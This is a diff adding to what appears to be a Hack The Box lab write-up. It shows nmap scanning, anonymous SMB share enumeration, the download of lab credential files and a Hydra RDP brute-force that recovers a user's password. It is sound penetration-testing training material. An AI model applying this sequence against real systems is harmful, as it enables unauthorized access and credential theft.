@@ -3358,7 +3358,7 @@ The second server is an internal server (within the inlanefreight.htb domain) th
 I started enumerating the ports, their service version and running the default scripts to have a big picture of my target machine.
 
 ```bash 
-nmap -p- -sC -sV -Pn 10.129.157.24
+sudo nmap -p- -sC -sV -Pn 10.129.157.24
 ```
 ```bash 
 # Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-22 20:42 CDT
@@ -3549,6 +3549,259 @@ cat flag.txt
 <summary><h2>Attacking Common Services (HARD)</h2></summary>
 
 The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.
+
+<details>
+<summary><h3>Enumeration</h3></summary>
+
+```bash 
+sudo nmap -p- -sC -sV -Pn 10.129.203.10
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-23 21:22 CDT
+Nmap scan report for 10.129.203.10
+Host is up (0.066s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.203.10:1433: 
+|     Target_Name: WIN-HARD
+|     NetBIOS_Domain_Name: WIN-HARD
+|     NetBIOS_Computer_Name: WIN-HARD
+|     DNS_Domain_Name: WIN-HARD
+|     DNS_Computer_Name: WIN-HARD
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.129.203.10:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-09-24T02:19:04
+|_Not valid after:  2055-09-24T02:19:04
+|_ssl-date: 2025-09-24T02:26:56+00:00; 0s from scanner time.
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-09-24T02:26:56+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=WIN-HARD
+| Not valid before: 2025-09-23T02:18:53
+|_Not valid after:  2026-03-25T02:18:53
+| rdp-ntlm-info: 
+|   Target_Name: WIN-HARD
+|   NetBIOS_Domain_Name: WIN-HARD
+|   NetBIOS_Computer_Name: WIN-HARD
+|   DNS_Domain_Name: WIN-HARD
+|   DNS_Computer_Name: WIN-HARD
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-09-24T02:26:16+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-09-24T02:26:18
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 292.33 seconds
+```
+
+</details>
+
+<details>
+<summary><h3>SMB</h3></summary>
+
+Listing the service
+
+```bash 
+smbclient -L 10.129.203.10
+# Password for [WORKGROUP\htb-ac-1640397]:
+
+# 	Sharename       Type      Comment
+# 	---------       ----      -------
+# 	ADMIN$          Disk      Remote Admin
+# 	C$              Disk      Default share
+# 	Home            Disk      
+# 	IPC$            IPC       Remote IPC
+# Reconnecting with SMB1 for workgroup listing.
+# do_connect: Connection to 10.129.203.10 failed (Error NT_STATUS_IO_TIMEOUT)
+# Unable to connect with SMB1 -- no workgroup available
+
+smb: \> dir
+#   .                                   D        0  Thu Apr 21 16:18:21 2022
+#   ..                                  D        0  Thu Apr 21 16:18:21 2022
+#   HR                                  D        0  Thu Apr 21 15:04:39 2022
+#   IT                                  D        0  Thu Apr 21 15:11:44 2022
+#   OPS                                 D        0  Thu Apr 21 15:05:10 2022
+#   Projects                            D        0  Thu Apr 21 15:04:48 2022
+
+# 		7706623 blocks of size 4096. 3143783 blocks available
+
+smb: \> cd IT
+smb: \IT\> dir
+#   .                                   D        0  Thu Apr 21 15:11:44 2022
+#   ..                                  D        0  Thu Apr 21 15:11:44 2022
+#   Fiona                               D        0  Thu Apr 21 15:11:53 2022
+#   John                                D        0  Thu Apr 21 16:15:09 2022
+#   Simon                               D        0  Thu Apr 21 16:16:07 2022
+
+# 		7706623 blocks of size 4096. 3143783 blocks available
+```
+
+<details>
+<summary><h4>Fiona</h4></summary>
+
+Listing Fiona
+
+```bash 
+smb: \IT\Fiona\> dir
+#   .                                   D        0  Thu Apr 21 15:11:53 2022
+#   ..                                  D        0  Thu Apr 21 15:11:53 2022
+#   creds.txt                           A      118  Thu Apr 21 15:13:11 2022
+
+# 		7706623 blocks of size 4096. 3141899 blocks available
+
+smb: \IT\Fiona\> mget creds.txt
+Get file creds.txt? yes
+# getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+```
+
+```bash 
+cat creds.txt
+```
+```bash
+# Windows Creds
+
+# kAkd03SA@#!
+# 48Ns72!bns74@S84NNNSl
+# SecurePassword!
+# Password123!
+# SecureLocationforPasswordsd123!!
+```
+
+</details>
+
+<details>
+<summary><h4>John</h4></summary>
+
+Listing John
+
+```bash 
+smb: \IT\John\> dir
+#   .                                   D        0  Thu Apr 21 16:15:09 2022
+#   ..                                  D        0  Thu Apr 21 16:15:09 2022
+#   information.txt                     A      101  Thu Apr 21 16:14:58 2022
+#   notes.txt                           A      164  Thu Apr 21 16:13:40 2022
+#   secrets.txt                         A       99  Thu Apr 21 16:15:55 2022
+
+# 		7706623 blocks of size 4096. 3141073 blocks available
+
+smb: \IT\John\> mget information.txt notes.txt secrets.txt
+Get file information.txt? yes
+# getting file \IT\John\information.txt of size 101 as information.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+Get file notes.txt? yes
+# getting file \IT\John\notes.txt of size 164 as notes.txt (0.6 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+Get file secrets.txt? yes
+# getting file \IT\John\secrets.txt of size 99 as secrets.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+```
+
+```bash 
+cat information.txt
+```
+```bash 
+# To do:
+# - Keep testing with the database.
+# - Create a local linked server.
+# - Simulate Impersonation.
+```
+```bash 
+cat notes.txt
+```
+```bash 
+# Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world ...
+```
+```bash 
+cat secrets.txt
+```
+```bash 
+# Password Lists:
+
+# 1234567
+# (DK02ka-dsaldS
+# Inlanefreight2022
+# Inlanefreight2022!
+# TestingDB123
+```
+
+</details>
+
+<details>
+<summary><h4>Simon</h4></summary>
+
+Listing Simon
+
+```bash 
+smb: \IT\Simon\> dir
+#   .                                   D        0  Thu Apr 21 16:16:07 2022
+#   ..                                  D        0  Thu Apr 21 16:16:07 2022
+#   random.txt                          A       94  Thu Apr 21 16:16:48 2022
+
+# 		7706623 blocks of size 4096. 3141070 blocks available
+
+smb: \IT\Simon\> mget random.txt
+Get file random.txt? yes
+# getting file \IT\Simon\random.txt of size 94 as random.txt (0.3 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+```
+
+```bash 
+cat random.txt
+```
+```bash 
+# Credentials
+
+# (k20ASD10934kadA
+# KDIlalsa9020$
+# JT9ads02lasSA@
+# Kaksd032klasdA#
+# LKads9kasd0-@
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>Brute-force</h3></summary>
+
+```bash 
+hydra -l fiona -P ./creds.txt 10.129.203.10 rdp
+```
+```bash 
+# Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-24 21:43:27
+# [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+# [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+# [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+# [DATA] max 4 tasks per 1 server, overall 4 tasks, 7 login tries (l:1/p:7), ~2 tries per task
+# [DATA] attacking rdp://10.129.203.10:3389/
+[3389][rdp] host: 10.129.203.10   login: fiona   password: 48Ns72!bns74@S84NNNSl
+# 1 of 1 target successfully completed, 1 valid password found
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-24 21:43:29
+```
+
+</details>
+
+
+```bash 
+smb: \> quit
+```
+
 
 </details>
 
